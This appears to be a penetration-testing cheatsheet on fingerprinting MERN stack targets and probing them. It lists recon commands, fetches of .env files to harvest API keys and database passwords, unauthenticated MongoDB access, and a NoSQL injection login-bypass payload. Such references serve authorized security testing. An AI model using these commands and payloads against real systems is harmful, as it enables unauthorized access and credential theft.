# MERN Stack Identification

**Knowledge Score:** 82/100  
**Last Updated:** June 21, 2026

---

## QUICK COMMANDS

### Identify MERN Stack
```bash
curl -sI http://target:3000 | grep -E "Server|X-Powered-By"
curl -sI http://target:5000 | head -5

# JavaScript frameworks
curl -s http://target | grep -E "React|Vue|Angular|webpack"

# Node.js hints
curl -sI http://target | grep -i "node\|express"
curl -s http://target | grep -E "production|development"
```

### Check for MongoDB
```bash
nmap -p 27017 target           # MongoDB default port
nmap -sV -p 27017 target       # Service version

# Try connection
mongo --host target
mongosh --host target
```

### Identify Express.js
```bash
curl -sI http://target | grep "X-Powered-By"
# Look for: Express, Express.js

curl -s http://target/api/
curl -s http://target/api/v1/
```

### React.js Indicators
```bash
curl -s http://target | grep -i "react\|root\|main"
curl -s http://target | grep "__REACT"

# Check for source maps (debugging info)
curl http://target/main.js.map
curl http://target/app.js.map
```

---

## ENUMERATION PAYLOADS

### Default Ports
```bash
3000  # React dev server / Express.js
5000  # Flask / Node.js alt
8000  # Django / Node.js
27017 # MongoDB
```

### Common Endpoints
```bash
/api/
/api/v1/
/api/users
/api/admin
/api/auth
/api/config

# Frontend assets
/js/main.js
/js/app.js
/css/style.css
/public/
```

### Headers Identifying MERN
```
X-Powered-By: Express
Server: Node.js
Content-Type: application/json (API responses)
```

### MongoDB Detection
```bash
# Try connection
mongo --host target --quiet
# Error = exposed, not authenticated
# Connection refused = not running
```

### API Enumeration
```bash
curl http://target/api/ 2>/dev/null | jq .
curl http://target/api/v1/ 2>/dev/null | jq .
ffuf -u http://target/api/FUZZ -w api-endpoints.txt
```

---

## EXPLOITATION SCENARIOS

### Scenario 1: Discover API Endpoints
```bash
curl http://target:3000/api/
# Response: List of available endpoints
```

### Scenario 2: MongoDB Access
```bash
mongo --host target
# If connects without auth = critical vulnerability
# Enumerate databases: show dbs
# Enumerate collections: use db_name; show collections
```

### Scenario 3: Extract Environment Variables
```bash
curl http://target/.env
curl http://target/.env.local
curl http://target/.env.development

# May contain: API keys, database passwords
```

### Scenario 4: React Source Map Leakage
```bash
curl http://target/main.js.map
# Reveals unminified source code
# Sensitive data, function names, logic
```

### Scenario 5: Express.js Exploitation
```bash
# Test for parameter pollution
curl "http://target/api/user?id=1&id=2"

# Test for NoSQL injection (MongoDB)
curl -X POST -d '{"username":{"$ne":""},"password":{"$ne":""}}' http://target/api/login
```

---

## DETECTION & VERIFICATION

### Confirm Node.js
```bash
curl -sI http://target | grep -i "node\|express"
curl -s http://target | grep -i "react\|webpack"
```

### Check MongoDB Accessibility
```bash
mongo --host target --eval "db.version()"
# Output = vulnerable (no auth)
# Error = protected or not running
```

### Enumerate API Structure
```bash
curl http://target/api/ | jq keys
# Shows available endpoints
```

---

## TECHNOLOGY DETECTION

| Indicator | Meaning |
|-----------|---------|
| `X-Powered-By: Express` | Express.js server |
| `/:3000` | Node.js common port |
| `React`, `webpack` | React frontend |
| `27017` open | MongoDB exposed |
| `/api/` endpoint | RESTful API |
| `.js.map` files | Source maps leaked |

---

## COMMON VULNERABILITIES

- **Exposed MongoDB** (27017 open, no auth)
- **Environment variables leaked** (.env file accessible)
- **Unprotected API endpoints** (no authentication)
- **Source map disclosure** (unminified code exposed)
- **NoSQL injection** (MongoDB query manipulation)
- **CORS misconfiguration** (cross-origin requests allowed)

---

## RELATED CHEATSHEETS

- LAMP-Stack-Identification.md
- Django-Framework-Identification.md
- Next.js-Framework-Identification.md

---

## REFERENCES

- Express.js: https://expressjs.com/
- MongoDB: https://www.mongodb.com/
- React: https://react.dev/

---

## CHANGELOG

**v1.0 (2026-06-21)** - Initial creation from Scripts & Notes
- MERN stack identification techniques
- MongoDB and Express.js detection
- API endpoint enumeration
- Common vulnerability patterns
